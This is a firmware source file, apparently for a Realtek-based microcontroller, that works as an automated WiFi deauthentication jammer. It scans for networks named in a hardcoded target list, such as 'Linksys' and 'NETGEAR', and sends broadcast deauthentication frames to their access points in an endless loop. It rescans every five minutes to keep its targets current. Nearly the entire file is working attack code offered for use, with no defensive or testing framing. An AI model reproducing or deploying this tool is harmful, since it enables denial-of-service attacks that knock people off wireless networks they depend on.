#undef max
#include "vector"
#include "wifi_conf.h"
#include "map"
#include "src/packet-injection/packet-injection.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"

// ── Target networks ──────────────────────────────────────────────────────────
// Add the SSIDs of the WiFi networks you want to deauth. The device will scan
// on boot (and periodically) to resolve their BSSIDs and channels automatically.
const char *TARGET_SSIDS[] = {
  "Linksys",
  "Guest Wireless",
  "NETGEAR",
  "NETGEAR-5G"
};
const int NUM_TARGETS = sizeof(TARGET_SSIDS) / sizeof(TARGET_SSIDS[0]);

// How often to rescan and refresh targets (milliseconds). Default: 5 minutes.
const unsigned long RESCAN_INTERVAL_MS = 5UL * 60UL * 1000UL;
// ─────────────────────────────────────────────────────────────────────────────

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::map<int, std::vector<int>> deauth_channels;
std::vector<int> chs_idx;
uint32_t current_ch_idx = 0;
uint32_t sent_frames = 0;

uint8_t deauth_bssid[6];
uint16_t deauth_reason = 0;

int frames_per_deauth = 5;
int send_delay = 5;
bool led = true;

unsigned long last_rescan_ms = 0;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

void scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
  } else {
    DEBUG_SER_PRINT(" failed!\n");
  }
}

// Match scan results to TARGET_SSIDS and populate deauth_channels / chs_idx.
void buildTargetList() {
  deauth_channels.clear();
  chs_idx.clear();
  current_ch_idx = 0;

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    for (int t = 0; t < NUM_TARGETS; t++) {
      if (scan_results[i].ssid == String(TARGET_SSIDS[t])) {
        int ch = scan_results[i].channel;
        deauth_channels[ch].push_back(i);
        // Only add a channel to chs_idx once.
        bool found = false;
        for (int c : chs_idx) if (c == ch) { found = true; break; }
        if (!found) chs_idx.push_back(ch);

        DEBUG_SER_PRINT("Target found: " + scan_results[i].ssid +
                        " [" + scan_results[i].bssid_str + "]" +
                        " CH" + String(ch) + "\n");
      }
    }
  }

  if (deauth_channels.empty()) {
    DEBUG_SER_PRINT("No target networks found in scan.\n");
  }
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();

  // Bring WiFi up in station mode (needed for scan + packet injection).
  wifi_on(RTW_MODE_STA);

  scanNetworks();
  buildTargetList();

  if (led) {
    digitalWrite(LED_R, HIGH);
  }

  last_rescan_ms = millis();
}

void loop() {
  // Periodic rescan so the device stays current if APs change channels.
  if (millis() - last_rescan_ms >= RESCAN_INTERVAL_MS) {
    DEBUG_SER_PRINT("Rescanning...\n");
    scanNetworks();
    buildTargetList();
    last_rescan_ms = millis();
  }

  if (!deauth_channels.empty()) {
    for (auto &group : deauth_channels) {
      int ch = group.first;
      if (ch == chs_idx[current_ch_idx]) {
        wext_set_channel(WLAN0_NAME, ch);

        std::vector<int> &networks = group.second;

        for (int i = 0; i < frames_per_deauth; i++) {
          if (led) digitalWrite(LED_B, HIGH);
          for (int idx : networks) {
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            sent_frames++;
          }
          delay(send_delay);
          if (led) digitalWrite(LED_B, LOW);
        }
      }
    }
    current_ch_idx++;
    if (current_ch_idx >= chs_idx.size()) {
      current_ch_idx = 0;
    }
  }

  wext_set_channel(WLAN0_NAME, current_channel);
}
